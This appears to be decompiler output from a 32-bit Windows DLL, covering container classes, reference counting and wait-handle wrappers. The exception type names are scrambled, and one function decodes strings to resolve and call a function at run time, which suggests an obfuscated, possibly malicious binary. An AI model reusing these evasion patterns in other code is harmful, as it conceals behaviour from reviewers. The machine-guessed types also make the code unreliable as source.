// 100748EC: using guessed type int (__thiscall *off_100748EC[2])(void *Block, char);
// 100748F0: using guessed type int (__thiscall *off_100748F0)(void *Block, char);

//----- (1002B9D0) --------------------------------------------------------
void **__thiscall sub_1002B9D0(void **this, void **a2)
{
  void (__thiscall **v3)(void **, int); // ebx
  int v4; // eax
  int v5; // eax

  if ( a2 != this )
  {
    j__free(this[3]);
    v3 = (void (__thiscall **)(void **, int))*this;
    this[2] = (void *)1;
    v4 = (*((int (__thiscall **)(void **))*a2 + 1))(a2);
    v5 = (*((int (__thiscall **)(void **, void *, int))*a2 + 1))(a2, a2[3], v4);
    v3[21](this, v5);
  }
  return this;
}

//----- (1002BA12) --------------------------------------------------------
void __thiscall sub_1002BA12(int this)
{
  *(_DWORD *)this = &off_10074930;
  j__free(*(void **)(this + 12));
  *(_DWORD *)(this + 12) = 0;
  sub_1002B19C((_DWORD *)this);
}
// 10074930: using guessed type int (__thiscall *off_10074930)(void *Block, char);

//----- (1002BA61) --------------------------------------------------------
int __thiscall sub_1002BA61(_DWORD *this)
{
  return this[1];
}

//----- (1002BA65) --------------------------------------------------------
int __thiscall sub_1002BA65(_DWORD *this, _DWORD *a2, unsigned int a3)
{
  int v4; // edi
  int v5; // eax
  unsigned int i; // eax
  int result; // eax

  if ( a3 != (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
    (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 76))(this, a3, &unk_1008E2EA);
  v4 = *this;
  v5 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
  (*(void (__thiscall **)(_DWORD *, int))(v4 + 60))(this, v5 + 1);
  for ( i = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this); i > a3; --i )
    *(_DWORD *)(this[3] + 4 * i) = *(_DWORD *)(this[3] + 4 * i - 4);
  result = this[3];
  *(_DWORD *)(result + 4 * a3) = *a2;
  ++this[1];
  return result;
}

//----- (1002BAC2) --------------------------------------------------------
int __thiscall sub_1002BAC2(int *this, int a2)
{
  int v3; // esi
  int v4; // eax

  v3 = *this;
  v4 = (*(int (__thiscall **)(int *))(*this + 4))(this);
  return (*(int (__thiscall **)(int *, int, int))(v3 + 32))(this, a2, v4);
}

//----- (1002BADD) --------------------------------------------------------
int __thiscall sub_1002BADD(_DWORD *this, unsigned int a2)
{
  unsigned int v2; // edi

  v2 = a2;
  (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 76))(this, a2, &unk_1008E2EB);
  --this[1];
  while ( v2 < (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
  {
    *(_DWORD *)(this[3] + 4 * v2) = *(_DWORD *)(this[3] + 4 * v2 + 4);
    ++v2;
  }
  *(_DWORD *)(this[3] + 4 * (*(int (__thiscall **)(_DWORD *))(*this + 4))(this)) = 0;
  return (*(int (__thiscall **)(_DWORD *))(*this + 88))(this);
}

//----- (1002BB29) --------------------------------------------------------
int __thiscall sub_1002BB29(_DWORD *this, int a2)
{
  (*(void (__thiscall **)(_DWORD *, int, void *))(*this + 76))(this, a2, &unk_1008E2EE);
  return this[3] + 4 * a2;
}

//----- (1002BB4A) --------------------------------------------------------
int __thiscall sub_1002BB4A(_DWORD *this, int a2)
{
  (*(void (__thiscall **)(_DWORD *, int, void *))(*this + 76))(this, a2, &unk_1008E2EF);
  return this[3] + 4 * a2;
}

//----- (1002BB6B) --------------------------------------------------------
void __thiscall sub_1002BB6B(_DWORD *this, unsigned int a2)
{
  void *v2; // esi

  if ( this[2] < a2 )
  {
    v2 = (void *)this[3];
    (*(void (__thiscall **)(_DWORD *, _DWORD, void *, unsigned int))(*this + 84))(this, this[1], v2, a2);
    j__free(v2);
  }
}

//----- (1002BB90) --------------------------------------------------------
int __thiscall sub_1002BB90(void **this)
{
  void *v2; // edx
  int result; // eax

  j__free(this[3]);
  v2 = *this;
  this[2] = (void *)1;
  result = (*((int (__thiscall **)(void **, _DWORD, _DWORD, int))v2 + 21))(this, 0, 0, 1);
  this[1] = 0;
  return result;
}

//----- (1002BBB4) --------------------------------------------------------
BOOL __thiscall sub_1002BBB4(void *this)
{
  return (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this) == 0;
}

//----- (1002BBBF) --------------------------------------------------------
int __thiscall sub_1002BBBF(_DWORD *this, unsigned int a2)
{
  unsigned int i; // edi
  int v4; // eax

  for ( i = a2; i < (*(int (__thiscall **)(_DWORD *))(*this + 4))(this); ++i )
    *(_DWORD *)(this[3] + 4 * i) = 0;
  (*(void (__thiscall **)(_DWORD *, unsigned int))(*this + 60))(this, a2);
  v4 = *this;
  this[1] = a2;
  return (*(int (__thiscall **)(_DWORD *))(v4 + 88))(this);
}

//----- (1002BC01) --------------------------------------------------------
unsigned int __thiscall sub_1002BC01(_DWORD *this, unsigned int a2, int a3, int a4)
{
  unsigned int v5; // edi
  unsigned int result; // eax

  (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 76))(this, a2, &unk_1008E2F2);
  (*(void (__thiscall **)(int, unsigned int))(*(_DWORD *)a3 + 60))(a3, a2);
  (*(void (__thiscall **)(int, unsigned int))(*(_DWORD *)a4 + 60))(a4, this[1] - a2);
  v5 = 0;
  result = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
  if ( result )
  {
    do
    {
      if ( v5 >= a2 )
        (*(void (__thiscall **)(int, unsigned int))(*(_DWORD *)a4 + 36))(a4, this[3] + 4 * v5);
      else
        (*(void (__thiscall **)(int, unsigned int))(*(_DWORD *)a3 + 36))(a3, this[3] + 4 * v5);
      ++v5;
      result = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
    }
    while ( v5 < result );
  }
  return result;
}

//----- (1002BC73) --------------------------------------------------------
unsigned int __thiscall sub_1002BC73(void *this, unsigned int pExceptionObject, int a3)
{
  unsigned int result; // eax

  result = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
  if ( pExceptionObject >= result )
  {
    sub_1000E15A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  return result;
}

//----- (1002BC9B) --------------------------------------------------------
unsigned int __stdcall sub_1002BC9B(unsigned int a1, unsigned int a2)
{
  unsigned int result; // eax

  for ( result = a1; result < a2; result *= 2 )
    ;
  return result;
}

//----- (1002BCAE) --------------------------------------------------------
unsigned int __thiscall sub_1002BCAE(_DWORD *this, int a2, int a3, int a4)
{
  int v5; // eax
  unsigned int v6; // edi
  unsigned int result; // eax

  v5 = (*(int (__thiscall **)(_DWORD *, _DWORD, int))(*this + 80))(this, this[2], a4);
  this[2] = v5;
  this[3] = operator new(4 * v5);
  this[1] = a2;
  v6 = 0;
  result = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
  if ( result )
  {
    do
    {
      *(_DWORD *)(this[3] + 4 * v6) = *(_DWORD *)(a3 + 4 * v6);
      ++v6;
      result = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
    }
    while ( v6 < result );
  }
  return result;
}

//----- (1002BD0C) --------------------------------------------------------
void __thiscall sub_1002BD0C(_DWORD *this)
{
  int v2; // edi
  int v3; // eax
  int v4; // edi
  int v5; // eax
  void *v6; // ebx
  _DWORD *v7; // edi
  int v8; // ebx
  void *Block; // [esp+8h] [ebp-10h]
  _DWORD *v10; // [esp+Ch] [ebp-Ch]
  int v11; // [esp+10h] [ebp-8h]
  unsigned int v12; // [esp+14h] [ebp-4h]

  if ( this[2] > 0x10u && (unsigned int)(2 * (*(int (__thiscall **)(_DWORD *))(*this + 4))(this)) <= this[2] )
  {
    v2 = *this;
    v3 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
    if ( (unsigned int)(*(int (__thiscall **)(_DWORD *, int, int))(v2 + 80))(this, 1, v3) <= 0x10 )
    {
      v11 = 16;
    }
    else
    {
      v4 = *this;
      v5 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
      v11 = (*(int (__thiscall **)(_DWORD *, int, int))(v4 + 80))(this, 1, v5);
    }
    v6 = (void *)this[3];
    Block = v6;
    v12 = 0;
    v7 = operator new(4 * v11);
    v10 = v7;
    if ( (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
    {
      v8 = (_BYTE *)v6 - (_BYTE *)v7;
      do
      {
        ++v12;
        *v7 = *(_DWORD *)((char *)v7 + v8);
        ++v7;
      }
      while ( v12 < (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) );
    }
    this[3] = v10;
    j__free(Block);
    this[2] = v11;
  }
}

//----- (1002BDC2) --------------------------------------------------------
void __thiscall sub_1002BDC2(_DWORD *this)
{
  *this = &off_1007498C;
  sub_10007EEF((int)(this + 5));
  sub_1002BA12((int)(this + 1));
  sub_1002AE65(this);
}
// 1007498C: using guessed type int (__thiscall *off_1007498C)(void *Block, char);

//----- (1002BE0D) --------------------------------------------------------
bool __thiscall sub_1002BE0D(_DWORD *this, _DWORD *a2)
{
  int v3; // edi

  v3 = sub_1002C351(this, a2);
  return v3 != (*(int (__thiscall **)(_DWORD *))(*this + 4))(this)
      && *(_DWORD *)(*(int (__thiscall **)(_DWORD *, int))(this[1] + 48))(this + 1, v3) == *a2;
}

//----- (1002BE47) --------------------------------------------------------
char __thiscall sub_1002BE47(_DWORD *this, _DWORD *a2)
{
  int v3; // edi

  v3 = sub_1002C351(this, a2);
  if ( v3 == (*(int (__thiscall **)(_DWORD *))(*this + 4))(this)
    || *(_DWORD *)(*(int (__thiscall **)(_DWORD *, int))(this[1] + 44))(this + 1, v3) != *a2 )
  {
    return 0;
  }
  (*(void (__thiscall **)(_DWORD *, int))(this[1] + 40))(this + 1, v3);
  (*(void (__thiscall **)(_DWORD *, int))(this[5] + 40))(this + 5, v3);
  return 1;
}

//----- (1002BE96) --------------------------------------------------------
int __thiscall sub_1002BE96(_DWORD *this, _DWORD *a2)
{
  _DWORD *v2; // edi
  int v4; // esi
  int v5; // eax

  v2 = a2;
  v4 = sub_1002C351(this, a2);
  if ( v4 == (*(int (__thiscall **)(_DWORD *))(*this + 4))(this)
    || *(_DWORD *)(*(int (__thiscall **)(_DWORD *, int))(this[1] + 44))(this + 1, v4) != *v2 )
  {
    (*(void (__thiscall **)(_DWORD *, _DWORD *, int))(this[1] + 32))(this + 1, v2, v4);
    v5 = this[5];
    HIBYTE(a2) = 0;
    (*(void (__thiscall **)(_DWORD *, char *, int))(v5 + 32))(this + 5, (char *)&a2 + 3, v4);
  }
  return (*(int (__thiscall **)(_DWORD *, int))(this[5] + 44))(this + 5, v4);
}

//----- (1002BEEE) --------------------------------------------------------
int __thiscall sub_1002BEEE(_DWORD *this, _DWORD *pExceptionObject)
{
  _DWORD *v2; // esi
  int v4; // edi

  v2 = pExceptionObject;
  v4 = sub_1002C351(this, pExceptionObject);
  if ( v4 == (*(int (__thiscall **)(_DWORD *))(*this + 4))(this)
    || *(_DWORD *)(*(int (__thiscall **)(_DWORD *, int))(this[1] + 48))(this + 1, v4) != *v2 )
  {
    sub_1000E15A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  return (*(int (__thiscall **)(_DWORD *, int))(this[5] + 48))(this + 5, v4);
}

//----- (1002BF43) --------------------------------------------------------
_DWORD *__thiscall sub_1002BF43(_DWORD *this, _DWORD *a2)
{
  sub_1002C2C0(this + 1, a2);
  return a2;
}

//----- (1002BF74) --------------------------------------------------------
_DWORD *__thiscall sub_1002BF74(_DWORD *this, _DWORD *a2)
{
  sub_100087D2(this + 5, a2);
  return a2;
}

//----- (1002BFA5) --------------------------------------------------------
int __thiscall sub_1002BFA5(_DWORD *this, int a2)
{
  (*(void (__thiscall **)(_DWORD *, int))(this[1] + 60))(this + 1, a2);
  return (*(int (__thiscall **)(_DWORD *))(this[5] + 60))(this + 5);
}

//----- (1002BFC0) --------------------------------------------------------
int __thiscall sub_1002BFC0(_DWORD *this)
{
  (*(void (__thiscall **)(_DWORD *))(this[1] + 52))(this + 1);
  return (*(int (__thiscall **)(_DWORD *))(this[5] + 52))(this + 5);
}

//----- (1002BFD4) --------------------------------------------------------
int __thiscall sub_1002BFD4(_DWORD *this)
{
  return (*(int (__thiscall **)(_DWORD *))(this[1] + 64))(this + 1);
}

//----- (1002BFDC) --------------------------------------------------------
_DWORD *__stdcall sub_1002BFDC(_DWORD *a1)
{
  *a1 = &off_1007489C;
  sub_1002C30E(a1 + 1);
  return a1;
}
// 1007489C: using guessed type int (__thiscall *off_1007489C)(void *Block, char);

//----- (1002C008) --------------------------------------------------------
void __thiscall sub_1002C008(_DWORD *this)
{
  *this = &off_1007489C;
  sub_1002BDC2(this + 1);
}
// 1007489C: using guessed type int (__thiscall *off_1007489C)(void *Block, char);

//----- (1002C02F) --------------------------------------------------------
int __thiscall sub_1002C02F(_DWORD *this)
{
  return (*(int (__thiscall **)(_DWORD *))(this[1] + 8))(this + 1);
}

//----- (1002C03B) --------------------------------------------------------
BOOL __thiscall sub_1002C03B(_DWORD *this, int a2)
{
  char v3; // bl

  v3 = (*(int (__thiscall **)(_DWORD *, int))(*this + 4))(this, a2);
  *(_BYTE *)(*(int (__thiscall **)(_DWORD *, int))(this[1] + 16))(this + 1, a2) = 1;
  return v3 == 0;
}

//----- (1002C067) --------------------------------------------------------
int __thiscall sub_1002C067(_DWORD *this)
{
  return (*(int (__thiscall **)(_DWORD *))(this[1] + 12))(this + 1);
}

//----- (1002C073) --------------------------------------------------------
int __thiscall sub_1002C073(_DWORD *this, int a2)
{
  (*(void (__thiscall **)(_DWORD *, int))(this[1] + 44))(this + 1, a2);
  return a2;
}

//----- (1002C0A4) --------------------------------------------------------
int __thiscall sub_1002C0A4(_DWORD *this, int a2)
{
  (*(void (__thiscall **)(_DWORD *, int))(this[1] + 32))(this + 1, a2);
  return a2;
}

//----- (1002C0D5) --------------------------------------------------------
int __thiscall sub_1002C0D5(_DWORD *this)
{
  return (*(int (__thiscall **)(_DWORD *))(this[1] + 52))(this + 1);
}

//----- (1002C0E1) --------------------------------------------------------
int __thiscall sub_1002C0E1(_DWORD *this)
{
  return (*(int (__thiscall **)(_DWORD *))(this[1] + 24))(this + 1);
}

//----- (1002C0E9) --------------------------------------------------------
int __thiscall sub_1002C0E9(_DWORD *this)
{
  return (*(int (__thiscall **)(_DWORD *))(this[1] + 28))(this + 1);
}

//----- (1002C105) --------------------------------------------------------
_DWORD *__userpurge sub_1002C105@<eax>(_DWORD *a1@<esi>, int a2)
{
  _DWORD *v2; // eax

  v2 = operator new(4u);
  if ( v2 )
    *v2 = 1;
  else
    v2 = 0;
  a1[1] = v2;
  *a1 = a2;
  return a1;
}

//----- (1002C144) --------------------------------------------------------
void __thiscall sub_1002C144(void *this)
{
  sub_1002C3E4((int)this);
}

//----- (1002C175) --------------------------------------------------------
_DWORD *__userpurge sub_1002C175@<eax>(_DWORD *a1@<esi>, int a2)
{
  _DWORD *v2; // eax

  v2 = operator new(4u);
  if ( v2 )
    *v2 = 1;
  else
    v2 = 0;
  a1[1] = v2;
  *a1 = a2;
  return a1;
}

//----- (1002C1B4) --------------------------------------------------------
void __thiscall sub_1002C1B4(void *this)
{
  sub_1002C40C((int)this);
}

//----- (1002C1F3) --------------------------------------------------------
_DWORD *__userpurge sub_1002C1F3@<eax>(_DWORD *a1@<esi>, int a2)
{
  _DWORD *v2; // eax

  v2 = operator new(4u);
  if ( v2 )
    *v2 = 1;
  else
    v2 = 0;
  a1[1] = v2;
  *a1 = a2;
  return a1;
}

//----- (1002C232) --------------------------------------------------------
void __thiscall sub_1002C232(void *this)
{
  sub_1002C446((int)this);
}

//----- (1002C263) --------------------------------------------------------
void *__thiscall sub_1002C263(void *Block, char a2)
{
  sub_1002BA12((int)Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1002C282) --------------------------------------------------------
_DWORD *__thiscall sub_1002C282(_DWORD *Block, char a2)
{
  sub_1002BDC2(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1002C2A1) --------------------------------------------------------
_DWORD *__thiscall sub_1002C2A1(_DWORD *Block, char a2)
{
  sub_1002C008(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1002C2C0) --------------------------------------------------------
_DWORD *__userpurge sub_1002C2C0@<eax>(_DWORD *a1@<esi>, _DWORD *a2)
{
  int v2; // eax
  int v4; // [esp-8h] [ebp-24h]
  int v5; // [esp-4h] [ebp-20h]

  sub_1002C499(a2);
  *a2 = &off_10074930;
  a2[2] = 1;
  v5 = (*(int (__thiscall **)(_DWORD *))(*a1 + 4))(a1);
  v4 = a1[3];
  v2 = (*(int (__thiscall **)(_DWORD *))(*a1 + 4))(a1);
  sub_1002BCAE(a2, v2, v4, v5);
  return a2;
}
// 10074930: using guessed type int (__thiscall *off_10074930)(void *Block, char);

//----- (1002C30E) --------------------------------------------------------
_DWORD *__stdcall sub_1002C30E(_DWORD *a1)
{
  sub_1002C46E(a1);
  *a1 = &off_1007498C;
  sub_1002C4C4(a1 + 1);
  sub_100089F2(a1 + 5);
  return a1;
}
// 1007498C: using guessed type int (__thiscall *off_1007498C)(void *Block, char);

//----- (1002C351) --------------------------------------------------------
int __userpurge sub_1002C351@<eax>(_DWORD *a1@<ebx>, _DWORD *a2)
{
  int v2; // esi
  int v3; // eax
  int v5; // [esp+4h] [ebp-8h]
  int v6; // [esp+8h] [ebp-4h]

  v6 = -1;
  v2 = (unsigned int)(*(int (__thiscall **)(_DWORD *))(*a1 + 4))(a1) >> 1;
  v5 = (*(int (__thiscall **)(_DWORD *))(*a1 + 4))(a1);
  if ( v2 > -1 )
  {
    do
    {
      if ( v2 >= v5 || *a2 == *(_DWORD *)(*(int (__thiscall **)(_DWORD *, int))(a1[1] + 48))(a1 + 1, v2) )
        break;
      if ( *a2 >= *(_DWORD *)(*(int (__thiscall **)(_DWORD *, int))(a1[1] + 48))(a1 + 1, v2) )
      {
        v6 = v2;
        v3 = v5 + v2 + 1;
      }
      else
      {
        v5 = v2;
        v3 = v2 + v6;
      }
      v2 = v3 / 2;
    }
    while ( v3 / 2 > v6 );
  }
  if ( v2 == v6 )
    return v6 + 1;
  return v2;
}

//----- (1002C3E4) --------------------------------------------------------
void __usercall sub_1002C3E4(int a1@<esi>)
{
  if ( !InterlockedDecrement(*(volatile LONG **)(a1 + 4)) )
  {
    if ( *(_DWORD *)(a1 + 4) )
      j__free(*(void **)(a1 + 4));
    if ( *(_DWORD *)a1 )
      (***(void (__thiscall ****)(_DWORD, int))a1)(*(_DWORD *)a1, 1);
  }
}

//----- (1002C40C) --------------------------------------------------------
void __usercall sub_1002C40C(int a1@<esi>)
{
  if ( !InterlockedDecrement(*(volatile LONG **)(a1 + 4)) )
  {
    if ( *(_DWORD *)(a1 + 4) )
      j__free(*(void **)(a1 + 4));
    if ( *(_DWORD *)a1 )
      (***(void (__thiscall ****)(_DWORD, int))a1)(*(_DWORD *)a1, 1);
  }
}

//----- (1002C446) --------------------------------------------------------
void __usercall sub_1002C446(int a1@<esi>)
{
  if ( !InterlockedDecrement(*(volatile LONG **)(a1 + 4)) )
  {
    if ( *(_DWORD *)(a1 + 4) )
      j__free(*(void **)(a1 + 4));
    if ( *(_DWORD *)a1 )
      (***(void (__thiscall ****)(_DWORD, int))a1)(*(_DWORD *)a1, 1);
  }
}

//----- (1002C46E) --------------------------------------------------------
_DWORD *__stdcall sub_1002C46E(_DWORD *a1)
{
  _DWORD *result; // eax

  result = a1;
  *a1 = off_10072944;
  *a1 = &off_100748C0;
  return result;
}
// 10072944: using guessed type int (__thiscall *off_10072944[2])(void *Block, char);
// 100748C0: using guessed type int (__thiscall *off_100748C0)(void *Block, char);

//----- (1002C499) --------------------------------------------------------
_DWORD *__stdcall sub_1002C499(_DWORD *a1)
{
  _DWORD *result; // eax

  result = a1;
  *a1 = off_10072944;
  *a1 = &off_100749C4;
  return result;
}
// 10072944: using guessed type int (__thiscall *off_10072944[2])(void *Block, char);
// 100749C4: using guessed type int (__thiscall *off_100749C4)(void *Block, char);

//----- (1002C4C4) --------------------------------------------------------
_DWORD *__stdcall sub_1002C4C4(_DWORD *a1)
{
  int v1; // eax

  sub_1002C499(a1);
  *a1 = &off_10074930;
  v1 = sub_1002BC9B(1u, 0x10u);
  sub_1002C515(v1, a1);
  return a1;
}
// 10074930: using guessed type int (__thiscall *off_10074930)(void *Block, char);

//----- (1002C515) --------------------------------------------------------
void *__usercall sub_1002C515@<eax>(int a1@<eax>, _DWORD *a2@<esi>)
{
  void *result; // eax

  a2[1] = 0;
  a2[2] = a1;
  result = operator new(4 * a1);
  a2[3] = result;
  return result;
}

//----- (1002C535) --------------------------------------------------------
_DWORD *__stdcall sub_1002C535(_DWORD *a1)
{
  sub_1000DEEF(a1);
  *a1 = &off_1007391C;
  return a1;
}
// 1007391C: using guessed type int (__thiscall *off_1007391C)(void *Block, char);

//----- (1002C563) --------------------------------------------------------
void __thiscall sub_1002C563(_DWORD *this)
{
  *this = &off_1007391C;
  sub_1000DF1A(this);
}
// 1007391C: using guessed type int (__thiscall *off_1007391C)(void *Block, char);

//----- (1002C587) --------------------------------------------------------
_DWORD *__stdcall sub_1002C587(_DWORD *a1)
{
  sub_1000DEEF(a1);
  *a1 = &off_10073924;
  return a1;
}
// 10073924: using guessed type int (__thiscall *off_10073924)(void *Block, char);

//----- (1002C5B5) --------------------------------------------------------
void __thiscall sub_1002C5B5(_DWORD *this)
{
  *this = &off_10073924;
  sub_1000DF1A(this);
}
// 10073924: using guessed type int (__thiscall *off_10073924)(void *Block, char);

//----- (1002C5D9) --------------------------------------------------------
_DWORD *__stdcall sub_1002C5D9(_DWORD *a1)
{
  sub_1000DEEF(a1);
  *a1 = &off_10074A80;
  return a1;
}
// 10074A80: using guessed type int (__thiscall *off_10074A80)(void *Block, char);

//----- (1002C607) --------------------------------------------------------
_DWORD *__thiscall sub_1002C607(_DWORD *Block, char a2)
{
  sub_1002C626(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1002C626) --------------------------------------------------------
void __thiscall sub_1002C626(_DWORD *this)
{
  *this = &off_10074A80;
  sub_1000DF1A(this);
}
// 10074A80: using guessed type int (__thiscall *off_10074A80)(void *Block, char);

//----- (1002C64A) --------------------------------------------------------
_DWORD *__stdcall sub_1002C64A(_DWORD *a1)
{
  *a1 = off_10074A7C;
  `eh vector constructor iterator'(
    a1 + 1,
    8u,
    64,
    (void (__thiscall *)(void *))sub_1002C6C9,
    (void (__thiscall *)(void *))sub_10014C9D);
  a1[129] = 0;
  a1[194] = 0;
  memset(a1 + 130, 0, 0x100u);
  return a1;
}
// 10074A7C: using guessed type int (__thiscall *off_10074A7C[2])(void *Block, char);

//----- (1002C6AA) --------------------------------------------------------
_DWORD *__thiscall sub_1002C6AA(_DWORD *Block, char a2)
{
  sub_1002C6D4(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1002C6C9) --------------------------------------------------------
void __thiscall sub_1002C6C9(_DWORD *this)
{
  sub_10014C49(this, (void *)0xFFFFFFFF, 0);
}

//----- (1002C6D4) --------------------------------------------------------
void __thiscall sub_1002C6D4(_DWORD *this)
{
  *this = off_10074A7C;
  `eh vector destructor iterator'(this + 1, 8u, 64, sub_10014C9D);
}
// 10074A7C: using guessed type int (__thiscall *off_10074A7C[2])(void *Block, char);

//----- (1002C705) --------------------------------------------------------
DWORD __cdecl sub_1002C705(HANDLE Handles, int a2)
{
  return sub_1002C718(&Handles, a2);
}

//----- (1002C718) --------------------------------------------------------
DWORD __cdecl sub_1002C718(HANDLE *lpHandles, int a2)
{
  int v2; // eax
  DWORD result; // eax
  DWORD v4[2]; // [esp+4h] [ebp-8h] BYREF

  sub_10030E11(v4, a2);
  while ( 1 )
  {
    v2 = sub_10030E28(v4);
    result = WaitForMultipleObjectsEx(1u, lpHandles, 1, v2, 1);
    if ( result != 192 )
      break;
    if ( sub_10030E49(v4) )
      return 258;
  }
  return result;
}
// 1002C718: using guessed type DWORD var_8[2];

//----- (1002C762) --------------------------------------------------------
int __usercall sub_1002C762@<eax>(int a1@<eax>, int a2@<esi>)
{
  int v2; // ebx
  int v3; // eax
  int result; // eax
  int pExceptionObject; // [esp+8h] [ebp-4h] BYREF

  v2 = a1 + 4;
  v3 = *(_DWORD *)(*(_DWORD *)(a1 + 4) + 16);
  if ( v3 == -1 || !v3 || *(_DWORD *)(a2 + 776) >= 0x40u || *(_DWORD *)(a2 + 516) )
  {
    sub_1000DEEF(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI1_AVSnsziibtx_sr__);
  }
  sub_1001287F();
  result = *(_DWORD *)(*(_DWORD *)v2 + 16);
  *(_DWORD *)(a2 + 4 * (*(_DWORD *)(a2 + 776))++ + 520) = result;
  return result;
}
// 1001287F: using guessed type int sub_1001287F(void);

//----- (1002C8C7) --------------------------------------------------------
_DWORD *__userpurge sub_1002C8C7@<eax>(int a1@<edi>, _DWORD *a2, int a3, char pExceptionObject)
{
  int v5; // eax
  DWORD v6; // esi
  DWORD v7; // eax
  _ThrowInfo *v8; // [esp-4h] [ebp-30h]
  int v9; // [esp+10h] [ebp-1Ch] BYREF
  DWORD v10[2]; // [esp+14h] [ebp-18h] BYREF
  int v11; // [esp+1Ch] [ebp-10h]
  int v12; // [esp+28h] [ebp-4h]

  v11 = 0;
  if ( *(_DWORD *)(a1 + 776) )
  {
    sub_10030E11(v10, a3);
    while ( 1 )
    {
      InterlockedIncrement((volatile LONG *)(a1 + 516));
      v5 = sub_10030E28(v10);
      v6 = WaitForMultipleObjectsEx(*(_DWORD *)(a1 + 776), (const HANDLE *)(a1 + 520), 1, v5, 1);
      InterlockedDecrement((volatile LONG *)(a1 + 516));
      if ( v6 == 258 )
      {
LABEL_12:
        sub_10014C49(a2, (void *)0xFFFFFFFF, 0);
        goto LABEL_13;
      }
      v7 = *(_DWORD *)(a1 + 776);
      if ( v6 <= v7 )
        break;
      if ( v6 >= 0x80 && v6 <= v7 + 128 )
      {
        sub_1002C535(&pExceptionObject);
        v8 = (_ThrowInfo *)&_TI2_AVNkwvkskhoJvvsaNkwvkskho_bjxssd_sr__;
        goto LABEL_16;
      }
      if ( v6 != 192 )
      {
        sub_1000E2E3(&v9, 1);
        _CxxThrowException(&v9, (_ThrowInfo *)&_TI2_AVScdeiYyksupovo_sr__);
      }
      if ( pExceptionObject )
      {
        sub_1002C5D9(&pExceptionObject);
        v8 = (_ThrowInfo *)&_TI2_AVYitzioIvrugxaFjqyitzio_gfjjefwq_sr__;
LABEL_16:
        _CxxThrowException(&pExceptionObject, v8);
      }
      if ( sub_10030E49(v10) )
        goto LABEL_12;
    }
    sub_1000F5EC(a2, a1 + 8 * v6 + 4);
LABEL_13:
    v12 = 0;
    v11 = 1;
  }
  else
  {
    sub_10014C49(a2, (void *)0xFFFFFFFF, 0);
    v12 = 0;
    v11 = 1;
  }
  return a2;
}
// 1007676C: using guessed type __TI_flags _TI2_AVYitzioIvrugxaFjqyitzio_gfjjefwq_sr__;
// 1002C8C7: using guessed type DWORD var_18[2];

//----- (1002CA8D) --------------------------------------------------------
_DWORD *__stdcall sub_1002CA8D(_DWORD *a1)
{
  sub_1000DEEF(a1);
  *a1 = &off_10074A88;
  return a1;
}
// 10074A88: using guessed type int (__thiscall *off_10074A88)(void *Block, char);

//----- (1002CABB) --------------------------------------------------------
_DWORD *__thiscall sub_1002CABB(_DWORD *Block, char a2)
{
  sub_1002CADA(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1002CADA) --------------------------------------------------------
void __thiscall sub_1002CADA(_DWORD *this)
{
  *this = &off_10074A88;
  sub_1000DF1A(this);
}
// 10074A88: using guessed type int (__thiscall *off_10074A88)(void *Block, char);

//----- (1002CAFE) --------------------------------------------------------
_DWORD *__stdcall sub_1002CAFE(_DWORD *a1, int a2)
{
  sub_1000DEEF(a1);
  *a1 = &off_10074280;
  a1[1] = a2;
  return a1;
}
// 10074280: using guessed type int (__thiscall *off_10074280)(void *Block, char);

//----- (1002CB36) --------------------------------------------------------
int __stdcall sub_1002CB36(int a1)
{
  wchar_t *v1; // eax
  int v2; // ecx
  wchar_t *v3; // eax
  int v4; // ecx
  char *v5; // eax
  int v7[2]; // [esp-10h] [ebp-34h] BYREF
  int v8[10]; // [esp-8h] [ebp-2Ch] BYREF
  int v9; // [esp+20h] [ebp-4h]

  v1 = (wchar_t *)sub_1000BE16((int)&unk_1008E4E0);
  v8[0] = v2;
  v8[7] = (int)v8;
  sub_10009D2C(v8, v1);
  v9 = 0;
  v3 = (wchar_t *)sub_1000BE16((int)&unk_1008E528);
  v7[0] = v4;
  v8[6] = (int)v7;
  sub_10009D2C(v7, v3);
  v9 = -1;
  v5 = sub_100265E5(v7[0], v7[1], v8[0]);
  return ((int (__stdcall *)(_DWORD))v5)(*(_DWORD *)(a1 + 4));
}
// 1002CB4C: variable 'v2' is possibly undefined
// 1002CB67: variable 'v4' is possibly undefined

//----- (1002CB94) --------------------------------------------------------
void __thiscall sub_1002CB94(_DWORD *this)
{
  *this = &off_10074280;
  sub_1000DF1A(this);
}
// 10074280: using guessed type int (__thiscall *off_10074280)(void *Block, char);

//----- (1002CBB8) --------------------------------------------------------
_DWORD *__stdcall sub_1002CBB8(_DWORD *a1)
{
  sub_1000DEEF(a1);
  *a1 = &off_10074A90;
  return a1;
}
// 10074A90: using guessed type int (__thiscall *off_10074A90)(void *Block, char);

//----- (1002CBE6) --------------------------------------------------------
_DWORD *__thiscall sub_1002CBE6(_DWORD *Block, char a2)
{
